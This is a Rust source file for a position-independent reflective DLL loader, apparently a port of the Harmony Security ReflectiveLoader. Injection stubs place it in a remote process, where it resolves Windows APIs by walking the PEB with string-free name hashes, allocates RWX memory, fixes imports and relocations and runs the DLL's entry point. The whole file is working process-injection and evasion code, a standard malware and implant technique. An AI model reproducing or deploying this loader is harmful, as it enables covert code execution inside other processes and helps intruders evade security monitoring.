//! Position-independent reflective loader, pure Rust (no C).
//!
//! This is a direct port of the Harmony Security `ReflectiveLoader` approach.
//! The injection stubs copy this DLL's raw bytes into a remote process and
//! start a thread on the exported `ReflectiveLoader` entry. When that thread
//! begins, the copied image is *not* relocated and its imports are *not*
//! resolved, so this function must be position independent end to end:
//!
//!   - It never reads relocatable data. All image structures are reached by
//!     computing addresses at runtime and reading with volatile scalar loads.
//!   - It resolves `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`,
//!     `NtFlushInstructionCache` and `RtlAddFunctionTable` by walking the PEB
//!     module list and export tables by hand. Module names are matched by a
//!     rotate hash of *immediate* constants — never through `.rodata` string
//!     literals, because a RIP-relative load into the file-offset-mapped raw
//!     copy would read the wrong bytes until the image has been relocated.
//!   - It copies the image into a fresh RWX allocation, fixes up imports,
//!     applies relocations, registers `.pdata` for exception unwinding and
//!     finally invokes the DLL's entry point.
//!
//! All loops use `wrapping_*` arithmetic and every memory access is volatile
//! so the compiler cannot lower any access to a `memcpy`/`memset` libcall or
//! introduce a panic edge (both would route through a not-yet-loaded IAT or
//! unwinder).

use core::arch::asm;

const MEM_RESERVE_COMMIT: u32 = 0x0000_3000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const DLL_PROCESS_ATTACH: u32 = 1;

// rotate-right-by-1 hashes of the names the loader resolves.
const KERNEL32_HASH: u32 = 0xC3A0_008F;
const NTDLL_HASH: u32 = 0xE600_0091;
const LOADLIBRARYA_HASH: u32 = 0x8DC0_0093;
const GETPROCADDRESS_HASH: u32 = 0x8708_00A0;
const VIRTUALALLOC_HASH: u32 = 0xB800_008F;
const NTFLUSH_HASH: u32 = 0xED3A_788A;

type LoadLibraryFn = unsafe extern "system" fn(name: *const u8) -> usize;
type GetProcAddressFn = unsafe extern "system" fn(module: usize, name: *const u8) -> usize;
type VirtualAllocFn = unsafe extern "system" fn(
    addr: usize,
    size: usize,
    allocation_type: u32,
    protect: u32,
) -> usize;
type NtFlushFn = unsafe extern "system" fn(handle: isize, base: usize, len: usize) -> i32;
type RtlAddFunctionTableFn = unsafe extern "system" fn(
    function_table: usize,
    entry_count: u32,
    base_address: u64,
) -> i32;
type DllMainFn = unsafe extern "system" fn(hinstance: usize, reason: u32, reserved: usize) -> i32;

// ---- Volatile scalar memory access (never lowered to libcalls) ----

#[inline(always)]
unsafe fn rd_u8(p: usize, off: usize) -> u8 {
    core::ptr::read_volatile((p + off) as *const u8)
}

#[inline(always)]
unsafe fn rd_u16(p: usize, off: usize) -> u16 {
    core::ptr::read_volatile((p + off) as *const u16)
}

#[inline(always)]
unsafe fn rd_u32(p: usize, off: usize) -> u32 {
    core::ptr::read_volatile((p + off) as *const u32)
}

#[inline(always)]
unsafe fn rd_u64(p: usize, off: usize) -> u64 {
    core::ptr::read_volatile((p + off) as *const u64)
}

#[inline(always)]
unsafe fn wr_u8(p: usize, off: usize, v: u8) {
    core::ptr::write_volatile((p + off) as *mut u8, v);
}

#[inline(always)]
unsafe fn wr_u64(p: usize, off: usize, v: u64) {
    core::ptr::write_volatile((p + off) as *mut u64, v);
}

// Unaligned-safe read so the base scan can step byte-by-byte.
#[inline(always)]
unsafe fn rd_u16_bytes(p: usize) -> u16 {
    rd_u8(p, 0) as u16 | ((rd_u8(p, 1) as u16) << 8)
}

#[inline(always)]
unsafe fn copy_bytes(dst: usize, src: usize, len: usize) {
    for i in 0..len {
        core::ptr::write_volatile((dst + i) as *mut u8, core::ptr::read_volatile((src + i) as *const u8));
    }
}

// ---- Immediate materializers: build byte strings without .rodata ----

#[inline(always)]
unsafe fn fill_u64(dst: usize, lit: u64) {
    wr_u8(dst, 0, (lit & 0xFF) as u8);
    wr_u8(dst, 1, ((lit >> 8) & 0xFF) as u8);
    wr_u8(dst, 2, ((lit >> 16) & 0xFF) as u8);
    wr_u8(dst, 3, ((lit >> 24) & 0xFF) as u8);
    wr_u8(dst, 4, ((lit >> 32) & 0xFF) as u8);
    wr_u8(dst, 5, ((lit >> 40) & 0xFF) as u8);
    wr_u8(dst, 6, ((lit >> 48) & 0xFF) as u8);
    wr_u8(dst, 7, ((lit >> 56) & 0xFF) as u8);
}

#[inline(always)]
unsafe fn fill_u32(dst: usize, lit: u32) {
    wr_u8(dst, 0, (lit & 0xFF) as u8);
    wr_u8(dst, 1, ((lit >> 8) & 0xFF) as u8);
    wr_u8(dst, 2, ((lit >> 16) & 0xFF) as u8);
    wr_u8(dst, 3, ((lit >> 24) & 0xFF) as u8);
}

// ---- Position-independent runtime resolution ----

/// Current instruction pointer, obtained with a RIP-relative LEA so it is
/// valid before the image is relocated.
#[inline(never)]
fn rip_here() -> usize {
    let ip: usize;
    unsafe {
        asm!(
            "lea {}, [rip]",
            out(reg) ip,
            options(nomem, nostack, preserves_flags),
        );
    }
    ip
}

/// x64 Process Environment Block via `gs:[0x60]`.
#[inline(never)]
unsafe fn peb_pointer() -> usize {
    let peb: usize;
    unsafe {
        asm!(
            "mov {}, qword ptr gs:[0x60]",
            out(reg) peb,
            options(nostack, preserves_flags),
        );
    }
    peb
}

/// Scan backwards from `start` for the MZ/PE header of the running image.
unsafe fn find_image_base(start: usize) -> usize {
    let mut p = start;
    loop {
        if p == 0 {
            return 0;
        }
        if rd_u16_bytes(p) == 0x5A4D {
            let lfanew = rd_u32(p, 0x3C) as usize;
            if (0x40..1024).contains(&lfanew) {
                let nt = p + lfanew;
                if rd_u32(nt, 0) == 0x0000_4550 {
                    return p;
                }
            }
        }
        p = p.wrapping_sub(1);
    }
}

/// Rotate `v` right by one bit.
#[inline(always)]
fn ror1(v: u32) -> u32 {
    v.wrapping_shr(1) | v.wrapping_shl(31)
}

/// ror hash of a UTF-16 code-unit buffer (case-normalized).
unsafe fn hash_wide(ptr: usize, nchars: usize) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < nchars {
        let c = rd_u16(ptr, i * 2);
        h = ror1(h);
        if (0x61..=0x7A).contains(&c) {
            h = h.wrapping_add((c - 0x20) as u32);
        } else {
            h = h.wrapping_add(c as u32);
        }
        i += 1;
    }
    h
}

/// ror hash of a NUL-terminated ASCII string, case-normalized as above.
unsafe fn hash_ascii(ptr: usize) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    loop {
        let c = rd_u8(ptr, i) as u32;
        if c == 0 {
            return h;
        }
        h = ror1(h);
        if (0x61..=0x7A).contains(&c) {
            h = h.wrapping_add(c - 0x20);
        } else {
            h = h.wrapping_add(c);
        }
        i += 1;
    }
}

/// Walk the loaded-module list for the module whose base-name rotates to
/// `want`; returns its base address or 0.
unsafe fn module_base_by_hash(peb: usize, want: u32) -> usize {
    let ldr = rd_u64(peb, 0x18) as usize;
    if ldr == 0 {
        return 0;
    }
    let head = rd_u64(ldr, 0x20) as usize;
    if head == 0 {
        return 0;
    }
    let mut cur = head;
    loop {
        if cur == 0 {
            return 0;
        }
        let entry = cur.wrapping_sub(0x10);
        let name_len = rd_u16(entry, 0x58) as usize;
        if name_len > 0 {
            let name_ptr = rd_u64(entry, 0x60) as usize;
            if name_ptr != 0 && hash_wide(name_ptr, name_len / 2) == want {
                return rd_u64(entry, 0x30) as usize;
            }
        }
        let next = rd_u64(entry, 0x10) as usize;
        if next == head || next == cur {
            break;
        }
        cur = next;
    }
    0
}

/// Resolve an export of `base` by its ror-hashed name; returns its VA or 0.
unsafe fn export_by_hash(base: usize, want: u32) -> usize {
    let lfanew = rd_u32(base, 0x3C) as usize;
    let dd = base + lfanew + 4 + 20 + 112;
    let ed_rva = rd_u32(dd, 0) as usize;
    if ed_rva == 0 {
        return 0;
    }
    let ed = base + ed_rva;
    let num_names = rd_u32(ed, 24) as usize;
    let addr_of_funcs = rd_u32(ed, 28) as usize;
    let addr_of_names = rd_u32(ed, 32) as usize;
    let addr_of_ord = rd_u32(ed, 36) as usize;
    if addr_of_funcs == 0 || addr_of_names == 0 || addr_of_ord == 0 {
        return 0;
    }
    for i in 0..num_names {
        let name_rva = rd_u32(base + addr_of_names, i * 4) as usize;
        if hash_ascii(base + name_rva) == want {
            let ordinal = rd_u16(base + addr_of_ord, i * 2) as usize;
            let fn_rva = rd_u32(base + addr_of_funcs, ordinal * 4) as usize;
            if fn_rva == 0 {
                return 0;
            }
            return base + fn_rva;
        }
    }
    0
}

/// Resolve an export by ordinal; returns its VA or 0.
unsafe fn export_by_ordinal(base: usize, ordinal: u16) -> usize {
    let lfanew = rd_u32(base, 0x3C) as usize;
    let dd = base + lfanew + 4 + 20 + 112;
    let ed_rva = rd_u32(dd, 0) as usize;
    if ed_rva == 0 {
        return 0;
    }
    let ed = base + ed_rva;
    let export_base = rd_u32(ed, 16) as usize;
    let num_funcs = rd_u32(ed, 20) as usize;
    let addr_of_funcs = rd_u32(ed, 28) as usize;
    if ordinal < export_base as u16 || addr_of_funcs == 0 {
        return 0;
    }
    let idx = ordinal as usize - export_base;
    if idx >= num_funcs {
        return 0;
    }
    let fn_rva = rd_u32(base + addr_of_funcs, idx * 4) as usize;
    if fn_rva == 0 {
        return 0;
    }
    base + fn_rva
}

// ---- The loader ----

/// Thread-start routine invoked by the `ReflectiveLoader` export on the
/// copied, un-relocated image. Returns the address of the newly loaded DLL's
/// entry point, or 0 on failure.
#[inline(never)]
pub extern "system" fn loader_impl(lpParameter: usize) -> usize {
    unsafe {
        // STEP 0: locate our own (un-relocated) image base.
        let ui_lib = find_image_base(rip_here());
        if ui_lib == 0 {
            return 0;
        }

        // STEP 1: resolve the APIs we need by name hash.
        let peb = peb_pointer();
        let k32 = module_base_by_hash(peb, KERNEL32_HASH);
        let ntdll = module_base_by_hash(peb, NTDLL_HASH);
        if k32 == 0 || ntdll == 0 {
            return 0;
        }
        let p_load = export_by_hash(k32, LOADLIBRARYA_HASH);
        let p_get_proc = export_by_hash(k32, GETPROCADDRESS_HASH);
        let p_alloc = export_by_hash(k32, VIRTUALALLOC_HASH);
        let p_flush = export_by_hash(ntdll, NTFLUSH_HASH);
        if p_load == 0 || p_get_proc == 0 || p_alloc == 0 {
            return 0;
        }
        let f_load: LoadLibraryFn = core::mem::transmute(p_load);
        let f_get_proc: GetProcAddressFn = core::mem::transmute(p_get_proc);
        let f_alloc: VirtualAllocFn = core::mem::transmute(p_alloc);
        let f_flush: NtFlushFn = core::mem::transmute(p_flush);

        // Register .pdata so unwinding through our code does not crash. The
        // proc-name string is materialized from immediates (no .rodata).
        let mut name_space = core::mem::MaybeUninit::<[u8; 20]>::uninit();
        let name_ptr = name_space.as_mut_ptr() as *mut u8 as usize;
        fill_u64(name_ptr, 0x7546_6464_416C_7452); // "RtlAddFu"
        fill_u64(name_ptr + 8, 0x6154_6E6F_6974_636E); // "nctionTa"
        fill_u32(name_ptr + 16, 0x0065_6C62); // "ble\0"
        let p_add_table = f_get_proc(ntdll, name_ptr as *const u8);

        // STEP 2: load the image into a fresh permanent location.
        let lfanew = rd_u32(ui_lib, 0x3C) as usize;
        if lfanew == 0 {
            return 0;
        }
        let opt = ui_lib + lfanew + 4 + 20;
        let image_base = rd_u64(opt, 24) as usize;
        let size_of_image = rd_u32(opt, 56) as usize;
        let ui_base = f_alloc(0, size_of_image, MEM_RESERVE_COMMIT, PAGE_EXECUTE_READWRITE);
        if ui_base == 0 {
            return 0;
        }

        // Copy the headers.
        copy_bytes(ui_base, ui_lib, rd_u32(opt, 60) as usize);

        // STEP 3: copy all sections.
        let coff = ui_lib + lfanew + 4;
        let num_sections = rd_u16(coff, 2) as usize;
        let opt_size = rd_u16(coff, 16) as usize;
        let sec = coff + 20 + opt_size;
        let mut si = 0;
        while si < num_sections {
            let s = sec + si * 40;
            let vaddr = rd_u32(s, 12) as usize;
            let raw_size = rd_u32(s, 16) as usize;
            let raw_ptr = rd_u32(s, 20) as usize;
            copy_bytes(ui_base + vaddr, ui_lib + raw_ptr, raw_size);
            si += 1;
        }

        // STEP 4: fix up imports.
        let dd = opt + 112;
        let imp_rva = rd_u32(dd, 8) as usize;
        if imp_rva != 0 {
            let imp = ui_base + imp_rva;
            let mut di = 0;
            loop {
                let desc = imp + di * 20;
                let name_rva = rd_u32(desc, 12);
                if name_rva == 0 {
                    break;
                }
                let hlib = f_load((ui_base + name_rva as usize) as *const u8);
                let oft_rva = rd_u32(desc, 0) as usize;
                let ft_rva = rd_u32(desc, 16) as usize;
                let mut iat = ui_base + ft_rva;
                let mut oft = if oft_rva != 0 { ui_base + oft_rva } else { 0 };
                loop {
                    let thunk = rd_u64(iat, 0);
                    if thunk == 0 {
                        break;
                    }
                    if oft != 0 && (thunk >> 63) == 1 {
                        let ordinal = (thunk & 0xFFFF) as u16;
                        wr_u64(iat, 0, export_by_ordinal(hlib, ordinal) as u64);
                    } else {
                        let name_rva2 = (thunk as u32) as usize;
                        let by_name = ui_base + name_rva2;
                        wr_u64(iat, 0, f_get_proc(hlib, (by_name + 2) as *const u8) as u64);
                    }
                    iat += 8;
                    if oft != 0 {
                        oft += 8;
                    }
                }
                di += 1;
            }
        }

        // STEP 5: apply relocations.
        let reloc_dd = dd + 0x28;
        let reloc_size = rd_u32(reloc_dd, 4);
        if reloc_size != 0 {
            let reloc_rva = rd_u32(reloc_dd, 0) as usize;
            let delta = ui_base.wrapping_sub(image_base);
            let mut r = ui_base + reloc_rva;
            loop {
                let block_size = rd_u32(r, 4);
                if block_size == 0 {
                    break;
                }
                let target = ui_base + rd_u32(r, 0) as usize;
                let mut count = (block_size as usize - 8) / 2;
                let mut e = r + 8;
                while count > 0 {
                    let word = rd_u16(e, 0) as usize;
                    let typ = (word >> 12) & 0xF;
                    let off = word & 0xFFF;
                    // Only DIR64 (10) needs applying; a single comparison is
                    // used deliberately: a multi-case dispatch lets LLVM emit
                    // a jump table in `.rodata`, whose RIP-relative address
                    // would be wrong in the raw copy.
                    if typ == 10 {
                        let v = rd_u64(target, off).wrapping_add(delta as u64);
                        wr_u64(target, off, v);
                    }
                    e += 2;
                    count -= 1;
                }
                r = r + block_size as usize;
            }
        }

        // STEP 5b: register the exception table (.pdata) with the OS.
        let exc_dd = dd + 0x30;
        let exc_rva = rd_u32(exc_dd, 0) as usize;
        let exc_size = rd_u32(exc_dd, 4) as usize;
        if p_add_table != 0 && exc_rva != 0 && exc_size != 0 {
            let f_add: RtlAddFunctionTableFn = core::mem::transmute(p_add_table);
            let _ = f_add(ui_base + exc_rva, (exc_size / 12) as u32, ui_base as u64);
        }

        // Flush the instruction cache so relocated code is used.
        let _ = f_flush(-1, 0, 0);

        // STEP 6: invoke the DLL entry point and return its address.
        let entry = ui_base + rd_u32(opt, 16) as usize;
        let f_entry: DllMainFn = core::mem::transmute(entry);
        let _ = f_entry(ui_base, DLL_PROCESS_ATTACH, lpParameter);
        entry
    }
}
